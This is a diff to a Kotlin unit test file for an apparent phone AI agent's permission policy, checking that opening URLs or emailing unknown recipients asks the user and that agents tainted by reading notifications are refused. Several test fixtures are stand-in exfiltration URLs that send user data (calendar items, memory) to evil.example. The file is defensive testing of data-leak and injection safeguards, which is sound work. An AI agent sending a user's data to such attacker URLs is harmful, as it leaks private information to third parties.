@@ -50,7 +50,7 @@ class PolicyTest {
         // effect on the phone, but it carries what the task read to someone else's server.
         val leak = args(OpenUrl, mapOf("url" to "https://evil.example/?d=Gym+Call+mom"))
         val p = Policy()
-        assertEquals(Verdict.AUTO, p.decide(OpenUrl, leak, agent).verdict) // untainted: fine
+        assertEquals(Verdict.ASK, p.decide(OpenUrl, leak, agent).verdict) // untainted: asks (see below)
         val d = p.decide(OpenUrl, leak, agent.copy(tainted = true, taintSources = listOf("notifications from Shell")))
         assertEquals(Verdict.DENY, d.verdict) // not on the allow-list: refused outright
         assertTrue(d.rule, d.rule.contains("evil.example isn't on your list") && d.rule.contains("notifications from Shell"))
@@ -104,5 +104,21 @@ class PolicyTest {
         // User says auto, agent floor says ask, user also blocked this capability entirely: deny wins.
         val p = Policy(PolicyConfig(levels = mapOf("delete_calendar_event" to Verdict.DENY)))
         assertEquals(Verdict.DENY, p.decide(DeleteCalendarEvent, delete, agent.copy(tainted = true)).verdict)
+    }
+
+    @Test fun untaintedAgentAsksBeforeSendingDataToNewPlaces() {
+        // A model can be malicious before it reads anything: it already knows memory and contacts.
+        val p = Policy(PolicyConfig(allowedDomains = setOf("wikipedia.org"), knownRecipients = setOf("dana@example.com")))
+        val evil = p.decide(OpenUrl, args(OpenUrl, mapOf("url" to "https://evil.example/?d=memory")), agent)
+        assertEquals(Verdict.ASK, evil.verdict)
+        assertTrue(evil.rule, evil.rule.contains("evil.example") && evil.rule.contains("Policy > Sites"))
+        // Places you already allowed keep the normal default.
+        assertEquals(Verdict.AUTO, p.decide(OpenUrl, args(OpenUrl, mapOf("url" to "en.wikipedia.org")), agent).verdict)
+        assertEquals(Verdict.AUTO, p.decide(ComposeEmail, args(ComposeEmail, mapOf("to" to "dana@example.com", "body" to "hi")), agent).verdict)
+        assertEquals(Verdict.ASK, p.decide(ComposeEmail, args(ComposeEmail, mapOf("to" to "a@b.co", "body" to "hi")), agent).verdict)
+        // What the user typed themselves doesn't ask.
+        assertEquals(Verdict.AUTO, p.decide(OpenUrl, args(OpenUrl, mapOf("url" to "evil.example")), user).verdict)
+        // A tainted task is still refused, not asked.
+        assertEquals(Verdict.DENY, p.decide(OpenUrl, args(OpenUrl, mapOf("url" to "evil.example")), agent.copy(tainted = true)).verdict)
     }
 }
